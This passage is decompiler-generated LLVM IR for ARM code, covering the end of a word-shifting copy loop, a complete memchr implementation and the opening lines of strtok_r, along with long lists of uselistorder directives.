  store i32 %v5_1b634, i32* @ip, align 4
  %v3_1b638 = mul i32 %v9_1b628, 16777216
  %v4_1b63c = udiv i32 %v6_1b628, 256
  %v5_1b63c = or i32 %v3_1b638, %v4_1b63c
  store i32 %v5_1b63c, i32* %r5.global-to-local, align 4
  %v3_1b640 = mul i32 %v6_1b628, 16777216
  %v4_1b644 = udiv i32 %v3_1b628, 256
  %v5_1b644 = or i32 %v3_1b640, %v4_1b644
  store i32 %v5_1b644, i32* %r4.global-to-local, align 4
  %v1_1b648 = add i32 %v0_1b648, -16
  %v2_1b648 = inttoptr i32 %v1_1b648 to i32*
  store i32 %v5_1b644, i32* %v2_1b648, align 4
  %v4_1b648 = add i32 %v0_1b648, -12
  %v5_1b648 = inttoptr i32 %v4_1b648 to i32*
  %v6_1b648 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1b648, i32* %v5_1b648, align 4
  %v7_1b648 = add i32 %v0_1b648, -8
  %v8_1b648 = inttoptr i32 %v7_1b648 to i32*
  %v9_1b648 = load i32, i32* @ip, align 4
  store i32 %v9_1b648, i32* %v8_1b648, align 4
  %v10_1b648 = add i32 %v0_1b648, -4
  %v11_1b648 = inttoptr i32 %v10_1b648 to i32*
  %v12_1b648 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1b648, i32* %v11_1b648, align 4
  store i32 %v1_1b648, i32* %r0.global-to-local, align 4
  %v0_1b64c = load i32, i32* %r2.global-to-local, align 4
  %v2_1b64c = add i32 %v0_1b64c, -16
  store i32 %v2_1b64c, i32* %r2.global-to-local, align 4
  %v6_1b650 = icmp slt i32 %v0_1b64c, 16
  br i1 %v6_1b650, label %dec_label_pc_1b654, label %dec_label_pc_1b624.dec_label_pc_1b624_crit_edge

dec_label_pc_1b624.dec_label_pc_1b624_crit_edge:  ; preds = %dec_label_pc_1b624
  %v0_1b624.pre = load i32, i32* @r3, align 4
  %v0_1b628.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b624

dec_label_pc_1b654:                               ; preds = %dec_label_pc_1b624
  %v2_1b654 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b654, i32* @r4, align 4
  %v5_1b654 = load i8*, i8** %stack_var_-8, align 4
  %v6_1b654 = ptrtoint i8* %v5_1b654 to i32
  store i32 %v6_1b654, i32* @r5, align 4
  store i32 %v11_1b620, i32* @lr, align 4
  %v2_1b658 = add i32 %v0_1b64c, -4
  store i32 %v2_1b658, i32* %r2.global-to-local, align 4
  %v4_1b658 = add i32 %v0_1b64c, 2147483632
  %v5_1b658 = and i32 %v2_1b658, %v4_1b658
  %v6_1b658 = icmp slt i32 %v5_1b658, 0
  store i1 %v6_1b658, i1* %cpsr_v.global-to-local, align 1
  %v7_1b658 = icmp slt i32 %v2_1b658, 0
  store i1 %v7_1b658, i1* %cpsr_n.global-to-local, align 1
  %v8_1b658 = icmp eq i32 %v2_1b658, 0
  store i1 %v8_1b658, i1* %cpsr_z.global-to-local, align 1
  %v5_1b65c = icmp slt i32 %v2_1b64c, -12
  br i1 %v5_1b65c, label %dec_label_pc_1b678, label %dec_label_pc_1b660

dec_label_pc_1b660:                               ; preds = %dec_label_pc_1b654, %dec_label_pc_1b614, %dec_label_pc_1b660
  %v1_1b66c = phi i32 [ %v5_1b66c, %dec_label_pc_1b660 ], [ %v1_1b648, %dec_label_pc_1b654 ], [ %v0_1b57018, %dec_label_pc_1b614 ]
  %v0_1b660 = load i32, i32* @r3, align 4
  %v3_1b660 = mul i32 %v0_1b660, 16777216
  store i32 %v3_1b660, i32* %ip.global-to-local, align 4
  %v0_1b664 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b664 = add i32 %v0_1b664, -4
  %v2_1b664 = inttoptr i32 %v1_1b664 to i32*
  %v3_1b664 = load i32, i32* %v2_1b664, align 4
  store i32 %v3_1b664, i32* @r3, align 4
  store i32 %v1_1b664, i32* %r1.global-to-local, align 4
  %v4_1b668 = udiv i32 %v3_1b664, 256
  %v5_1b668 = or i32 %v4_1b668, %v3_1b660
  store i32 %v5_1b668, i32* @ip, align 4
  %v2_1b66c = add i32 %v1_1b66c, -4
  %v3_1b66c = inttoptr i32 %v2_1b66c to i32*
  store i32 %v5_1b668, i32* %v3_1b66c, align 4
  %v4_1b66c = load i32, i32* %r0.global-to-local, align 4
  %v5_1b66c = add i32 %v4_1b66c, -4
  store i32 %v5_1b66c, i32* %r0.global-to-local, align 4
  %v0_1b670 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b670 = add i32 %v0_1b670, -4
  store i32 %v2_1b670, i32* %r2.global-to-local, align 4
  %v6_1b674 = icmp slt i32 %v0_1b670, 4
  br i1 %v6_1b674, label %dec_label_pc_1b678.loopexit, label %dec_label_pc_1b660

dec_label_pc_1b678.loopexit:                      ; preds = %dec_label_pc_1b660
  %v4_1b670 = sub i32 3, %v0_1b670
  %v5_1b670 = and i32 %v4_1b670, %v0_1b670
  %v6_1b670 = icmp slt i32 %v5_1b670, 0
  %v7_1b670 = icmp slt i32 %v2_1b670, 0
  store i1 %v6_1b670, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1b670, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b678

dec_label_pc_1b678:                               ; preds = %dec_label_pc_1b678.loopexit, %dec_label_pc_1b654
  %v2_1b4e452 = phi i32 [ %v5_1b66c, %dec_label_pc_1b678.loopexit ], [ %v1_1b648, %dec_label_pc_1b654 ]
  %v0_1b4d448 = phi i32 [ %v2_1b670, %dec_label_pc_1b678.loopexit ], [ %v2_1b658, %dec_label_pc_1b654 ]
  %v0_1b678 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b678 = add i32 %v0_1b678, 1
  store i32 %v1_1b678, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1b66c, { 0, 2, 1 }
  uselistorder i32 %v3_1b660, { 1, 0 }
  uselistorder i32 %v2_1b658, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b648, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1b628, { 1, 0 }
  uselistorder i32 %v3_1b624, { 1, 0 }
  uselistorder i32 %v0_1b628, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1b648, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1b600, { 0, 2, 1 }
  uselistorder i32 %v3_1b5f4, { 1, 0 }
  uselistorder i32 %v2_1b5ec, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b5dc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1b5bc, { 1, 0 }
  uselistorder i32 %v3_1b5b8, { 1, 0 }
  uselistorder i32 %v0_1b5bc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1b5dc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1b594, { 0, 2, 1 }
  uselistorder i32 %v3_1b588, { 1, 0 }
  uselistorder i32 %v2_1b580, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b570, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1b550, { 1, 0 }
  uselistorder i32 %v3_1b54c, { 1, 0 }
  uselistorder i32 %v0_1b550, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1b570, { 3, 2, 1, 0 }
  uselistorder i1 %v5_1b618, { 2, 0, 1 }
  uselistorder i32 %v0_1b530, { 1, 0 }
  uselistorder i32 %v0_1b61c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1b57018, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1b520, { 2, 1, 0 }
  uselistorder i32 %v0_1b520, { 2, 0, 1 }
  uselistorder i32 %v2_1b518, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_1b518, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1b518, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1b57019, { 2, 1, 0 }
  uselistorder i32 %v11_1b4f4, { 1, 0 }
  uselistorder i32 %v7_1b4f4, { 1, 0 }
  uselistorder i32 %v1_1b4d4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1b4d4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1b4d8, { 1, 0 }
  uselistorder i32 %v7_1b4cc, { 0, 2, 1 }
  uselistorder i32 %v10_1b4c8, { 1, 0 }
  uselistorder i32 %v9_1b4c0, { 1, 0, 2 }
  uselistorder i32 %v6_1b4bc, { 1, 0 }
  uselistorder i32 %v2_1b4b4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_1b4b4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1b4c4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_1b4a8, { 0, 2, 1 }
  uselistorder i32 %v13_1b4a4, { 1, 0 }
  uselistorder i32 %v4_1b4a0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_1b4a0, { 2, 0, 1 }
  uselistorder i32 %v6_1b4a8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_1b498, { 0, 2, 1 }
  uselistorder i32 %v16_1b494, { 1, 0 }
  uselistorder i32 %v4_1b490, { 1, 2, 0 }
  uselistorder i32 %v0_1b4a0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_1b498, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1b484, { 0, 3, 2, 1 }
  uselistorder i32 %v10_1b480, { 1, 0 }
  uselistorder i32 %v1_1b47c, { 1, 0 }
  uselistorder i32 %v10_1b478, { 1, 0 }
  uselistorder i32 %v0_1b478, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1b47c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_1b470, { 0, 2, 1 }
  uselistorder i32 %v2_1b464, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_1b464, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1b47c36, { 1, 2, 0 }
  uselistorder i32 %v1_1b45c, { 2, 1, 0 }
  uselistorder i32 %v1_1b454, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1b44c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_1b448, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1b444, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1b444, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_1b434, { 0, 2, 1 }
  uselistorder i32 %v4_1b430, { 1, 0 }
  uselistorder i32 %v3_1b424, { 1, 0 }
  uselistorder i32 %v1_1b41c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b410, { 1, 0 }
  uselistorder i32 %v12_1b40c, { 0, 2, 1 }
  uselistorder i32 %v8_1b3ec, { 1, 0, 2 }
  uselistorder i32 %v5_1b3ec, { 1, 0, 2 }
  uselistorder i32 %v2_1b3ec, { 1, 0, 2 }
  uselistorder i32 %v0_1b3ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1b40c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1b3c8, { 0, 2, 1 }
  uselistorder i32 %v4_1b3c4, { 1, 0 }
  uselistorder i32 %v3_1b3b8, { 1, 0 }
  uselistorder i32 %v1_1b3b0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b3a4, { 1, 0 }
  uselistorder i32 %v12_1b3a0, { 0, 2, 1 }
  uselistorder i32 %v8_1b380, { 1, 0, 2 }
  uselistorder i32 %v5_1b380, { 1, 0, 2 }
  uselistorder i32 %v2_1b380, { 1, 0, 2 }
  uselistorder i32 %v0_1b380, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1b3a0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1b35c, { 0, 2, 1 }
  uselistorder i32 %v4_1b358, { 1, 0 }
  uselistorder i32 %v3_1b34c, { 1, 0 }
  uselistorder i32 %v1_1b344, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b338, { 1, 0 }
  uselistorder i32 %v12_1b334, { 0, 2, 1 }
  uselistorder i32 %v8_1b314, { 1, 0, 2 }
  uselistorder i32 %v5_1b314, { 1, 0, 2 }
  uselistorder i32 %v2_1b314, { 1, 0, 2 }
  uselistorder i32 %v0_1b314, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1b334, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_1b370, { 0, 2, 1 }
  uselistorder i32 %v1_1b36c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_1b2f0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1b2f0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1b374, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1b40c75, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_1b2e4, { 1, 0 }
  uselistorder i32 %v0_1b2e4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1b2dc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1b2dc, { 1, 0, 2 }
  uselistorder i32 %v0_1b2dc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1b40c76, { 1, 0 }
  uselistorder i32 %v1_1b2bc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_1b2c4, { 1, 0 }
  uselistorder i32 %v0_1b298, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1b28c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_1b278, { 1, 0, 2 }
  uselistorder i32 %v1_1b274, { 1, 0 }
  uselistorder i32 %v1_1b26c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1b26c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1b264, { 0, 2, 1 }
  uselistorder i32 %v3_1b264, { 3, 0, 1, 2 }
  uselistorder i1 %v0_1b264, { 1, 0 }
  uselistorder i1 %v1_1b264, { 1, 0 }
  uselistorder i32 %v3_1b260, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1b258, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b244, { 1, 2, 0 }
  uselistorder i32 %v1_1b23c, { 0, 2, 1 }
  uselistorder i32 %v12_1b238, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1b22c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1b230, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_1b220, { 0, 2, 1 }
  uselistorder i32 %v1_1b218, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1b218, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_1b210, { 1, 0 }
  uselistorder i32 %v1_1b208, { 2, 1, 0 }
  uselistorder i32 %v2_1b200, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_1b200, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1b1fc, { 1, 0 }
  uselistorder i32 %v2_1b1f0, { 1, 0 }
  uselistorder i32 %v1_1b1f0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_1b1f0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 68, 1, 2, 3, 4, 5, 69, 6, 7, 8, 9, 10, 70, 11, 12, 66, 67, 71, 27, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 29, 61, 30, 31, 32, 33, 34, 62, 35, 36, 37, 38, 39, 63, 40, 41, 42, 43, 44, 64, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 77, 4, 6, 8, 10, 7, 78, 9, 11, 13, 75, 12, 79, 74, 76, 80, 83, 81, 87, 88, 14, 15, 16, 18, 17, 19, 20, 82, 21, 22, 84, 23, 85, 24, 86, 25, 26, 27, 28, 29, 31, 33, 30, 45, 32, 34, 36, 38, 35, 46, 37, 39, 41, 43, 40, 47, 42, 44, 48, 49, 54, 50, 52, 51, 53, 55, 58, 56, 59, 57, 60, 61, 67, 62, 63, 68, 64, 69, 65, 70, 66, 71, 72, 73, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 56, 3, 4, 57, 5, 6, 58, 7, 55, 61, 62, 8, 9, 21, 10, 12, 11, 13, 14, 59, 15, 16, 60, 17, 18, 19, 20, 22, 23, 31, 24, 25, 32, 26, 27, 33, 28, 29, 34, 30, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 50, 51, 45, 46, 47, 52, 48, 49, 53, 54, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 5, 2, 7, 44, 8, 6, 46, 47, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 1, 22, 0, 23, 45, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_v.global-to-local, { 5, 6, 3, 8, 43, 9, 7, 44, 10, 11, 12, 13, 14, 15, 16, 17, 18, 4, 19, 20, 21, 1, 22, 0, 23, 2, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 5, 2, 7, 47, 8, 6, 49, 50, 9, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18, 19, 20, 21, 22, 1, 23, 0, 24, 48, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1b660, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b5f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b588, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b528, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_1b4b4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1b478, { 1, 0 }
  uselistorder label %dec_label_pc_1b464, { 1, 0 }
  uselistorder label %dec_label_pc_1b424, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b3b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b34c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b2ec, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_1b2bc, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_1b258, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_1b218, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1b684 = urem i32 %arg1, 256
  %v0_1b6a0.pr = load i32, i32* @r2, align 4
  %v2_1b6a015 = icmp eq i32 %v0_1b6a0.pr, 0
  %v0_1b6b4.pre = load i32, i32* @r0, align 4
  br i1 %v2_1b6a015, label %dec_label_pc_1b6b0, label %dec_label_pc_1b6a8

dec_label_pc_1b68c:                               ; preds = %dec_label_pc_1b6a8
  %v1_1b68c = inttoptr i32 %v0_1b69c to i8*
  %v2_1b68c = load i8, i8* %v1_1b68c, align 1
  %v3_1b68c = zext i8 %v2_1b68c to i32
  %v9_1b690 = icmp eq i32 %v3_1b68c, %v1_1b684
  br i1 %v9_1b690, label %dec_label_pc_1b760, label %dec_label_pc_1b698

dec_label_pc_1b698:                               ; preds = %dec_label_pc_1b68c
  %v1_1b698 = add i32 %v0_1b698, -1
  %v1_1b69c = add i32 %v0_1b69c, 1
  %v2_1b6a0 = icmp eq i32 %v1_1b698, 0
  br i1 %v2_1b6a0, label %dec_label_pc_1b6b0, label %dec_label_pc_1b6a8

dec_label_pc_1b6a8:                               ; preds = %entry, %dec_label_pc_1b698
  %v0_1b698 = phi i32 [ %v1_1b698, %dec_label_pc_1b698 ], [ %v0_1b6a0.pr, %entry ]
  %v0_1b69c = phi i32 [ %v1_1b69c, %dec_label_pc_1b698 ], [ %v0_1b6b4.pre, %entry ]
  %v1_1b6a8 = urem i32 %v0_1b69c, 4
  %v2_1b6a8 = icmp eq i32 %v1_1b6a8, 0
  br i1 %v2_1b6a8, label %dec_label_pc_1b6b0, label %dec_label_pc_1b68c

dec_label_pc_1b6b0:                               ; preds = %dec_label_pc_1b698, %dec_label_pc_1b6a8, %entry
  %v0_1b72c22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1b698 ], [ %v0_1b698, %dec_label_pc_1b6a8 ]
  %v0_1b6b4 = phi i32 [ %v0_1b6b4.pre, %entry ], [ %v1_1b69c, %dec_label_pc_1b698 ], [ %v0_1b69c, %dec_label_pc_1b6a8 ]
  %v4_1b6b0 = mul nuw nsw i32 %v1_1b684, 256
  %v5_1b6b0 = or i32 %v4_1b6b0, %v1_1b684
  %v4_1b6b8 = mul i32 %v5_1b6b0, 65536
  %v5_1b6b8 = or i32 %v4_1b6b8, %v5_1b6b0
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1b72c22, 3
  br i1 %tmp, label %dec_label_pc_1b6c0, label %dec_label_pc_1b754.preheader

dec_label_pc_1b6c0:                               ; preds = %dec_label_pc_1b6b0, %dec_label_pc_1b72c.backedge
  %v0_1b6dc60 = phi i32 [ %v1_1b6dc, %dec_label_pc_1b72c.backedge ], [ %v0_1b72c22, %dec_label_pc_1b6b0 ]
  %v0_1b70059 = phi i32 [ %v4_1b6c0, %dec_label_pc_1b72c.backedge ], [ %v0_1b6b4, %dec_label_pc_1b6b0 ]
  %v1_1b6c0 = inttoptr i32 %v0_1b70059 to i32*
  %v2_1b6c0 = load i32, i32* %v1_1b6c0, align 4
  %v4_1b6c0 = add i32 %v0_1b70059, 4
  %v2_1b6c4 = xor i32 %v2_1b6c0, %v5_1b6b8
  %v2_1b6c8 = add i32 %v2_1b6c4, 2130640639
  %v1_1b6cc = sub i32 -1, %v2_1b6c4
  %v2_1b6d0 = xor i32 %v2_1b6c8, %v1_1b6cc
  %v2_1b6d4 = and i32 %v2_1b6d0, -2130640640
  %v2_1b6d8 = icmp eq i32 %v2_1b6d4, 0
  %v1_1b6dc = add i32 %v0_1b6dc60, -4
  br i1 %v2_1b6d8, label %dec_label_pc_1b72c.backedge, label %dec_label_pc_1b6e4

dec_label_pc_1b72c.backedge:                      ; preds = %dec_label_pc_1b6c0, %dec_label_pc_1b71c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_1b6dc, 3
  br i1 %tmp73, label %dec_label_pc_1b6c0, label %dec_label_pc_1b754.preheader

dec_label_pc_1b6e4:                               ; preds = %dec_label_pc_1b6c0
  %v2_1b6e4 = inttoptr i32 %v0_1b70059 to i8*
  %v3_1b6e4 = load i8, i8* %v2_1b6e4, align 1
  %v4_1b6e4 = zext i8 %v3_1b6e4 to i32
  %v9_1b6ec = icmp eq i32 %v4_1b6e4, %v1_1b684
  %v1_1b6f0 = add i32 %v0_1b70059, 3
  store i32 %v1_1b6f0, i32* @ip, align 4
  br i1 %v9_1b6ec, label %dec_label_pc_1b760, label %dec_label_pc_1b6f8

dec_label_pc_1b6f8:                               ; preds = %dec_label_pc_1b6e4
  %v1_1b6f8 = add i32 %v0_1b70059, 1
  %v2_1b6f8 = inttoptr i32 %v1_1b6f8 to i8*
  %v3_1b6f8 = load i8, i8* %v2_1b6f8, align 1
  %v4_1b6f8 = zext i8 %v3_1b6f8 to i32
  %v9_1b6fc = icmp eq i32 %v4_1b6f8, %v1_1b684
  br i1 %v9_1b6fc, label %bb, label %dec_label_pc_1b70c

bb:                                               ; preds = %dec_label_pc_1b6f8
  br label %dec_label_pc_1b760

dec_label_pc_1b70c:                               ; preds = %dec_label_pc_1b6f8
  %v1_1b70c = add i32 %v0_1b70059, 2
  %v2_1b70c = inttoptr i32 %v1_1b70c to i8*
  %v3_1b70c = load i8, i8* %v2_1b70c, align 1
  %v4_1b70c = zext i8 %v3_1b70c to i32
  %v9_1b710 = icmp eq i32 %v4_1b70c, %v1_1b684
  br i1 %v9_1b710, label %dec_label_pc_1b760, label %dec_label_pc_1b71c

dec_label_pc_1b71c:                               ; preds = %dec_label_pc_1b70c
  %v2_1b71c = inttoptr i32 %v1_1b6f0 to i8*
  %v3_1b71c = load i8, i8* %v2_1b71c, align 1
  %v4_1b71c = zext i8 %v3_1b71c to i32
  %v9_1b720 = icmp eq i32 %v4_1b71c, %v1_1b684
  br i1 %v9_1b720, label %bb36, label %dec_label_pc_1b72c.backedge

bb36:                                             ; preds = %dec_label_pc_1b71c
  br label %dec_label_pc_1b760

dec_label_pc_1b754.preheader:                     ; preds = %dec_label_pc_1b72c.backedge, %dec_label_pc_1b6b0
  %v0_1b700.lcssa = phi i32 [ %v0_1b6b4, %dec_label_pc_1b6b0 ], [ %v4_1b6c0, %dec_label_pc_1b72c.backedge ]
  %v0_1b6dc.lcssa = phi i32 [ %v0_1b72c22, %dec_label_pc_1b6b0 ], [ %v1_1b6dc, %dec_label_pc_1b72c.backedge ]
  %v2_1b7547 = icmp eq i32 %v0_1b6dc.lcssa, 0
  br i1 %v2_1b7547, label %dec_label_pc_1b75c, label %dec_label_pc_1b744

dec_label_pc_1b744:                               ; preds = %dec_label_pc_1b750, %dec_label_pc_1b754.preheader
  %v0_1b754.in = phi i32 [ %v0_1b754, %dec_label_pc_1b750 ], [ %v0_1b6dc.lcssa, %dec_label_pc_1b754.preheader ]
  %v0_1b750 = phi i32 [ %v1_1b750, %dec_label_pc_1b750 ], [ %v0_1b700.lcssa, %dec_label_pc_1b754.preheader ]
  %v0_1b754 = add i32 %v0_1b754.in, -1
  %v1_1b744 = inttoptr i32 %v0_1b750 to i8*
  %v2_1b744 = load i8, i8* %v1_1b744, align 1
  %v3_1b744 = zext i8 %v2_1b744 to i32
  %v9_1b748 = icmp eq i32 %v3_1b744, %v1_1b684
  br i1 %v9_1b748, label %dec_label_pc_1b760, label %dec_label_pc_1b750

dec_label_pc_1b750:                               ; preds = %dec_label_pc_1b744
  %v1_1b750 = add i32 %v0_1b750, 1
  %v2_1b754 = icmp eq i32 %v0_1b754, 0
  br i1 %v2_1b754, label %dec_label_pc_1b75c, label %dec_label_pc_1b744

dec_label_pc_1b75c:                               ; preds = %dec_label_pc_1b750, %dec_label_pc_1b754.preheader
  br label %dec_label_pc_1b760

dec_label_pc_1b760:                               ; preds = %dec_label_pc_1b68c, %dec_label_pc_1b70c, %dec_label_pc_1b6e4, %dec_label_pc_1b744, %bb36, %bb, %dec_label_pc_1b75c
  %v1_1b764 = phi i32 [ 0, %dec_label_pc_1b75c ], [ %v1_1b6f8, %bb ], [ %v1_1b6f0, %bb36 ], [ %v0_1b750, %dec_label_pc_1b744 ], [ %v1_1b70c, %dec_label_pc_1b70c ], [ %v0_1b70059, %dec_label_pc_1b6e4 ], [ %v0_1b69c, %dec_label_pc_1b68c ]
  ret i32 %v1_1b764

; uselistorder directives
  uselistorder i32 %v1_1b6dc, { 1, 0, 2 }
  uselistorder i32 %v0_1b70059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_1b6b0, { 1, 0 }
  uselistorder i32 %v0_1b72c22, { 1, 2, 0 }
  uselistorder i32 %v0_1b69c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_1b6b4.pre, { 1, 0 }
  uselistorder i32 %v1_1b684, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_1b760, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_1b72c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1b6c0, { 1, 0 }
  uselistorder label %dec_label_pc_1b6b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b6a8, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1b770 = load i32, i32* @r4, align 4
  store i32 %v3_1b770, i32* %stack_var_-16, align 4
